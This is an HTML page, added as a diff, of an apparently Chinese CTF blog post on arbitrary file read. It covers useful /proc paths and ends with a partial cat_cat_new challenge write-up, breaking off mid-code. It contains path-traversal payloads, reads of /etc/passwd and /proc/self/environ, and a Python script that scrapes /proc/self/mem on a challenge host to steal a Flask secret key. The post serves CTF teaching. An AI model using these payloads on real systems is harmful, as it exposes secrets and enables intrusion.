@@ -1,0 +1,771 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>任意文件读取 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x2F-etc-x2F-passwd"><span class="toc-number">3.</span> <span class="toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x2F-proc"><span class="toc-number">4.</span> <span class="toc-text">&#x2F;proc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cmdline"><span class="toc-number">4.1.</span> <span class="toc-text">cmdline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#environ"><span class="toc-number">4.2.</span> <span class="toc-text">environ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#status"><span class="toc-number">4.3.</span> <span class="toc-text">status</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cwd"><span class="toc-number">4.4.</span> <span class="toc-text">cwd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exe"><span class="toc-number">4.5.</span> <span class="toc-text">exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fd"><span class="toc-number">4.6.</span> <span class="toc-text">fd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#maps-amp-mem"><span class="toc-number">4.7.</span> <span class="toc-text">maps&amp;mem</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-cat-cat-new"><span class="toc-number">4.7.1.</span> <span class="toc-text">攻防世界-cat_cat_new</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%95%8F%E6%84%9F%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84"><span class="toc-number">5.</span> <span class="toc-text">一些敏感配置文件的路径</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>任意文件读取</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/5/20
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="color: #00a596">文件包含</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">3.1k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">14分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>页面上通过传参读取到的某些文件、图片，其参数处就存在任意文件读取</p>
+<p>本篇会收集一些常读取的目录，主要会侧重于&#x2F;proc目录的利用</p>
+<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>直接读取指定文件或使用<code>file://</code>协议进行读取一些特殊路径</p>
+<span id="more"></span>
+
+<h1 id="x2F-etc-x2F-passwd"><a href="#x2F-etc-x2F-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h1><p>一个文本文件，包含了Linux系统中所有用户的基本信息，如用户名、用户ID（UID）、主组ID（GID）、家目录路径、默认Shell等。每行记录一个用户信息，每个字段用冒号（:）分隔</p>
+<h1 id="x2F-proc"><a href="#x2F-proc" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h1><blockquote>
+<p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc  是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态</p>
+</blockquote>
+<p>简单来讲，<code>/proc</code> 目录即保存在系统内存中的信息，大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看</p>
+<p><code>/proc</code>目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号(PID)，里面包含对应进程相关的多个信息文件，&#x2F;proc&#x2F;self即指当前进程的id</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241148#h3-6">https://www.anquanke.com/post/id/241148#h3-6</a></p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231125120633873.png" alt="image-20231125120633873"></p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231125120942283.png" alt="image-20231125120942283"></p>
+<hr>
+<h2 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h2><blockquote>
+<p>cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/proc/self/cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>会返回当前进程的命令行参数</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231125121219242.png" alt="image-20231125121219242"></p>
+<h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/proc/self/environ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>当前进程的环境变量，和执行<code>env</code>命令差不多</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231025113748893.png" alt="image-20231025113748893"></p>
+<h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/proc/self/status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>当前进程的状态信息，如进程ID、父进程ID、内存占用等</p>
+<h2 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/proc/self/cwd/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>它是一个符号链接，指向当前进程的当前工作目录，可以借此进行目录穿越读取文件</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231025113645789.png" alt="image-20231025113645789"></p>
+<h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><blockquote>
+<p>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接</p>
+</blockquote>
+<p>通过exe文件我们可以获得指定进程的可执行文件的完整路径</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/proc/self/exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231125121519056.png" alt="image-20231125121519056"></p>
+<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><blockquote>
+<p>fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file  descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里</p>
+</blockquote>
+<blockquote>
+<p>文件描述符：当Linux启动的时候会默认打开三个文件描述符，分别是<code>标准输入standard input 0</code>，<code>标准输出standard output 1</code>，<code>错误输出error output 2</code>。文件所有输入输出都是由该进程所有打开的文件描述符控制的（linux一切皆文件）</p>
+</blockquote>
+<p>所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/proc/self/fd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231125121956665.png" alt="image-20231125121956665"></p>
+<p>查看指定进程打开的某个文件的内容</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> <span class="token parameter variable">-al</span> /proc/self/fd/2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231125122334857.png" alt="image-20231125122334857"></p>
+<p>这个fd比较重要，因为在 linux 系统中，如果一个程序用<code>open()</code>打开了一个文件但最终没有关闭他，即便从外部（如<code>os.remove(SECRET_FILE)</code>）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容</p>
+<hr>
+<h2 id="maps-amp-mem"><a href="#maps-amp-mem" class="headerlink" title="maps&amp;mem"></a>maps&amp;mem</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/proc/self/maps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>当前进程的内存映射信息，可通过读取该文件来得到内存数据映射的地址</p>
+</blockquote>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20231125123935471.png" alt="image-20231125123935471"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/proc/self/mem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<p>当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据</p>
+</blockquote>
+<p>但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合<code>/proc/self/maps</code>中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。这里其实接近webpwn了</p>
+<p>这个单独拉出来讲，在2022年的<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1760">蓝帽杯初赛file_session</a>中出现过这个考点</p>
+<p>我们知道像flask框架中的<code>SECRET_KEY</code>本质上还是一个<strong>全局变量</strong>，而这些全局变量必定要被存放起来，存放的位置就是在内存中</p>
+<p>那么就需要通过&#x2F;proc读取内存，计算内存偏移得到我们需要的内容</p>
+<p>流程：先去读取&#x2F;proc&#x2F;self&#x2F;maps的信息 ，然后通过map里栈的地址 ，再去正则匹配里面的信息，然后再根据读出来的地址查mem内存 ，接着通过地址范围正则匹配我们需要的key</p>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+<span class="token keyword">import</span> requests
+
+maps<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">)</span>
+b <span class="token operator">=</span> maps<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token builtin">list</span> <span class="token operator">=</span> b<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\\n'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">'rw'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>
+        addr <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'([0-9a-f]+)-([0-9a-f]+)'</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>
+        <span class="token comment">#正则匹配地址,地址格式为十六进制数[0-9a-f],reserch会返回一个re.Match对象，用括号括起来是为了使用group()处理返回结果。</span>
+        start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#将十六进制字符转化为十进制数，为了符合start参数格式参考链接</span>
+        end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token comment">#将十六进制字符转化为十进制数，为了符合end参数格式</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span>
+        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://61.147.171.105:63646/info?file=../../../proc/self/mem&amp;start=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>start<span class="token punctuation">&#125;</span></span><span class="token string">&amp;end=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>end<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+        <span class="token comment">#使用start和end参数读取mem</span>
+        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        secret_key <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"[a-z0-9]&#123;32&#125;\*abcdefgh"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>  <span class="token comment">#uuid4()生成的字符串除去-符号后为固定的32字节（128bit），find</span>
+        <span class="token keyword">if</span> secret_key<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="攻防世界-cat-cat-new"><a href="#攻防世界-cat-cat-new" class="headerlink" title="攻防世界-cat_cat_new"></a>攻防世界-cat_cat_new</h3><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/niyani/p/17074125.html">https://www.cnblogs.com/niyani/p/17074125.html</a></p>
+<p>进入题目，随便点开一只猫猫的介绍</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517222809706.png" alt="image-20240517222809706"></p>
+<p>发现存在任意文件读取，尝试读取&#x2F;etc&#x2F;passwd</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517222941382.png" alt="image-20240517222941382"></p>
+<p>测试发现得用相对路径读</p>
+<p>用<code>../../../proc/self/cmdline</code>读一下当前命令行参数</p>
+<p><img src="/blog/2023/05/20/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/image-20240517223419055.png" alt="image-20240517223419055"></p>
+<p>可知起web服务的文件是app.py，翻目录读一下，位置在<code>../app.py</code></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
+<span class="token keyword">import</span> uuid
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> Markup
+<span class="token keyword">from</span> cat <span class="token keyword">import</span> cat
+
+flag <span class="token operator">=</span> <span class="token string">""</span>
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>
+    __name__<span class="token punctuation">,</span>
+    static_url_path<span class="token operator">=</span><span class="token string">'/'</span><span class="token punctuation">,</span>
+    static_folder<span class="token operator">=</span><span class="token string">'static'</span>
+<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"*abcdefgh"</span>
+<span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    flag <span class="token operator">=</span> cat<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    detailtxt <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'./details/'</span><span class="token punctuation">)</span>
+    cats_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> detailtxt<span class="token punctuation">:</span>
+        cats_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token punctuation">:</span>i<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> cats_list<span class="token operator">=</span>cats_list<span class="token punctuation">,</span> cat<span class="token operator">=</span>cat<span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    filename <span class="token operator">=</span> <span class="token string">"./details/"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
+    start <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'start'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
+    end <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
+    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"detail.html"</span><span class="token punctuation">,</span> catname<span class="token operator">=</span>name<span class="token punctuation">,</span> info<span class="token operator">=</span>cat<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">admin_can_list_root</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> flag
